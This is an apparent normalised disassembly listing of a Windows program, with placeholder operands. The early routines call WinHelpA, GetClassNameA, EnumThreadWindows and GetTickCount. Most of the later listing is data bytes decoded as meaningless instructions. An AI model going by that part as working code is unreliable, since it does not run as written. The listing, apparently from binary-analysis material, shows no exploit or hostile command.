pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f4b
lea eax [ ebp - 0x1c ]
call sub_403f5c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_435b98
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_436434
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fb0
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40441c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_435fb4
push ebx
mov ebx eax
mov eax ebx
call sub_435f98
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405598
pop ebx
retn
mov eax rw-data
call sub_405598
sub_435fe4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43603c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436043
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_435b98
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43604c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436142
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408b30
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_435b98
mov eax ebx
call sub_4364dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436149
lea eax [ ebp - 0x110 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041cc
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_436434
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041cc
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_436160
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4361c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4361c9
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_435b98
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4361d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436254
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_435b98
mov eax ebx
call sub_4364dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43625b
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_436434
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_436364
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4085a8
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4363bf
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408584
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_436434
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40440c
xor eax eax
push ebp
push sub_4364aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_436418
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4364b1
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407abc
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4364c0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4364dc
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_436418
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4364bc
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4364c0
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_436538
sub_436538
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4365b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_435f98
call GetTickCount
mov ebx eax
push 0x0
call sub_4060cc
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_435b98
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4365bc
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4365c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403530
call sub_4055b0
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_43660c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_436638
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4366a6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4366ad
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405598
mov eax rw-data
call sub_405598
mov eax rw-data
call sub_405598
mov eax rw-data
call sub_403f5c
mov eax rw-data
call sub_405598
mov eax [ rw-data ]
call sub_435c68
sub_4366b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436702
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436709
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4365c4
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405598
mov edx eax
mov eax [ rw-data ]
call sub_422e94
sub_43670c
adc [ edi + 0x43 ] ah
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
pop eax
xchg ecx eax
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ eax + 0x68004391 ] ch
xor al 0x40
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx + 0x68 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 8 + 0x67 ] si
inc ebx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
sub al 0x67
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add al ch
inc ebx
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax - 0x57ffbc6f ] bh
xchg ecx eax
inc ebx
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x68
jae r-xdata
add [ ecx + ebp * 2 + 0x43 ] bh
inc esp
jb r-xdata
add [ eax - 0x6f ] bl
inc ebx
add [ eax ] bl
xchg edx eax
inc ebx
add al cl
xchg ecx eax
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] cl
jb r-xdata
inc ebx
add [ eax + 0x34004392 ] dl
nop
inc ebx
add ah ch
xchg ecx eax
inc ebx
add al bh
pop [ ebx ]
pushfd
xchg edx eax
inc ebx
add [ eax - 0x6f ] dl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
jl r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edx + edx * 4 + 0x43 ] al
add [ ecx + edx * 4 ] dh
inc ebx
add [ eax ] dh
xchg ecx eax
inc ebx
add [ eax + edx * 4 ] dh
inc ebx
add ah ch
xchg ecx eax
inc ebx
add al bh
pop [ ebx ]
dec esp
xchg ecx eax
inc ebx
add [ eax - 0x6f ] dl
inc ebx
add [ ebx + 0x43688cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004368 ] bh
add [ eax ] al
add [ edi + 0x34540043 ] bl
inc eax
add [ eax - 0x57ffbc6f ] bh
xchg ecx eax
inc ebx
add [ eax + 0x34 ] ch
inc eax
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
inc esp
inc ebx
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x67 ] al
inc ebx
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ edx + edx * 4 - 0x6de7ffbd ] bh
inc ebx
add al cl
xchg ecx eax
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
xchg ecx eax
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x24 ] si
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add al 0x69
inc ebx
add [ esp + esi + 0x40 ] dl
add [ eax - 0x23ffbc6f ] bh
xchg edx eax
inc ebx
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edx + edx * 4 + 0x43 ] al
add [ eax - 0x6e ] bh
nop
fsubr [ ecx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push 0x43
add [ eax ] al
add [ eax ] al
inc eax
push 0x34540043
inc eax
add [ eax - 0x57ffbc6f ] bh
inc ebx
xchg ecx eax
inc ebx
add [ eax + 0x34 ] ch
inc eax
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x2c ] si
push 0x16070043
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 4 + 0x6a ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 2 + 0x6a ] si
inc ebx
add al dl
push 0x43
or [ ebx + 0x6f ] al
outsb
je r-xdata
xchg ecx eax
inc ebx
add [ eax - 0x6f ] dl
inc ebx
add [ eax - 0x6f ] bl
inc ebx
add al dl
xchg ebx eax
inc ebx
add al ah
xchg edx eax
inc ebx
add [ eax ] bl
xchg esp eax
inc ebx
add [ esp + edx * 4 - 0x6b57ffbd ] dl
inc ebx
add al cl
xchg esp eax
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
add [ esp + edx * 4 - 0x6ecfffbd ] bh
inc ebx
add [ eax + edx * 4 ] dh
inc ebx
add [ ebx + edx * 4 + 0x43 ] dh
add al bh
pop [ ebx ]
dec esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
insb
push 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7000436a ] ch
add [ eax ] al
add [ eax + 0x68 ] al
inc ebx
add [ esp + esi + 0x40 ] dl
add [ eax - 0x57ffbc6f ] bh
xchg ecx eax
inc ebx
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ebx + edx * 4 + 0x43 ] al
add [ edx + edx * 4 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edx + edx * 4 + 0x43 ] al
add [ eax - 0x6e ] bh
pop esp
xor al 0x40
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc eax
add al dh
pop [ ebx ]
xor al 0x91
inc ebx
add [ eax ] dh
xchg ecx eax
inc ebx
add [ eax + edx * 4 ] dh
inc ebx
add [ eax - 0x7ffbc71 ] bl
pop [ ebx ]
xor [ eax ] eax
adc al 0x32
outsd
insd
inc ecx
add [ esi + edi - 0x2973ffbf ] bh
inc ecx
add [ eax - 0x2a ] bh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
int3
add [ eax - 0x6f ] bl
inc ebx
add al dl
xchg ebx eax
inc ebx
add al ah
xchg edx eax
inc ebx
add [ eax ] bl
xchg esp eax
inc ebx
add [ esp + edx * 4 - 0x6b57ffbd ] dl
inc ebx
add al cl
xchg esp eax
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ esp + esi + 0x40 ] bl
inc ebx
outsd
outsb
je r-xdata
dec esp
xchg ecx eax
inc ebx
je r-xdata
xor al 0x40
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ esp + esi + 0x40 ] dl
add [ eax - 0x2fffbc6f ] bh
xchg esp eax
inc ebx
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ebx + edx * 4 + 0x43 ] al
add [ edx + edx * 4 + 0x43 ] al
add [ esp + edx * 4 - 0x6ecfffbd ] bh
inc ebx
add [ eax + edx * 4 ] dh
inc ebx
add [ ebx + edx * 4 + 0x43 ] dh
add al bh
pop [ ebx ]
dec esp
xchg ecx eax
inc ebx
add [ eax - 0x6f ] dl
inc ebx
add [ ebx + 0x436b30c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x43 ] ch
add [ eax ] dh
add [ eax ] al
and [ edx + 0x43 ] ch
inc ebx
add [ eax + 0x34004392 ] dl
nop
inc ebx
add ah ch
xchg ecx eax
inc ebx
add al bh
pop [ ebx ]
pushfd
xchg edx eax
inc ebx
add [ eax - 0x6f ] dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 4 + 0x68 ] si
inc ebx
add [ eax ] bl
push 0x43
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax - 0x6f ] dl
inc ebx
add [ eax - 0x6f ] bl
inc ebx
add [ ecx + edx * 4 + 0x43 ] cl
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x436d0090
add [ ebx ] al
or al 0x54
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esp + ebx * 4 + 0x41 ] cl
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
jae r-xdata
inc ebx
add [ edx + edx * 4 - 0x6de7ffbd ] bh
inc ebx
add al cl
xchg ecx eax
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add ah al
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
inc edx
jne r-xdata
inc ecx
add ah cl
cmpsb [ esi ] [ edi ]
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
imul eax [ ebx ] 0x64
add [ eax ] al
add [ ecx + esi * 4 + 0x34540041 ] ah
inc eax
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x5fffbc5a ] ah
aas
inc ecx
add [ eax - 0x43ffbec1 ] ch
clc
imul eax [ ebx ] 0x7
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x69500040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esi + ebp * 2 + 0x43 ] ch
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ecx
add [ eax ] dh
stosd [ edi ]
inc ebx
add [ esp + ebx * 4 - 0x5423ffbf ] dh
inc ebx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x13ffbe64 ] bl
pushfd
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
test al 0x43
add [ eax ] esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6d ] bh
inc ebx
add [ ebx ] cl
jae r-xdata
cld
insd
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
insb
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] dl
test eax 0x9c800043
dec esp
pushfd
inc ecx
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
insd
inc ebx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
sar [ ebp + ebp * 2 + 0x43 ] 0x0
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc ecx
add [ esi + edx * 8 - 0x2987ffbf ] cl
imul eax [ ebx ] 0x10
mov dl 0x41
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
jo r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
jo r-xdata
inc ebx
outsd
outsb
jae r-xdata
add [ eax - 0x43ffbec1 ] ch
inc ecx
add ah bh
test al 0x43
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ edx + ebp * 4 ] bl
inc ebx
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x436e7c74
jb r-xdata
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
outsd
inc ebx
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x2800413e ] dl
push 0x5c004034
xor al 0x40
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
or dl [ esp + eax * 2 + 0x72 ]
popad
insd
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x6c6c0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
insb
inc ebx
add [ eax + eax ] bl
add [ eax ] al
lodsb [ esi ]
jpe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x437048c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add [ eax + eax ] dl
add bh bh
jo r-xdata
inc ebx
outsd
insb
jae r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
outsb
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
jne r-xdata
inc ebx
add [ eax ] dl
add [ eax ] al
push [ eax - 0x58 ]
js r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
shr [ edi + 0x43 ] 0x1
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
outsb
imul ebp [ esi + 0x74 ] 0x436ee873
add [ edi + edx ] dh
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
adc al 0x6f
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x6e24c08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
enter 0x436d 0x0
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
insb
add [ ecx + eax * 4 - 0x556fffbc ] dl
inc ebx
add [ ecx + eax * 4 - 0x7e2fffbc ] bh
inc esp
add [ eax ] cl
lodsb [ esi ]
inc ebx
add ah al
stosb [ edi ]
inc ebx
add [ edx + eax * 4 ] cl
inc esp
add [ eax ] ah
add [ eax + eax - 0x4 ] 0xaa
inc ebx
add [ eax - 0x7e ] cl
inc esp
add [ eax - 0x55 ] bl
inc ebx
add [ eax - 0x7e ] dl
inc esp
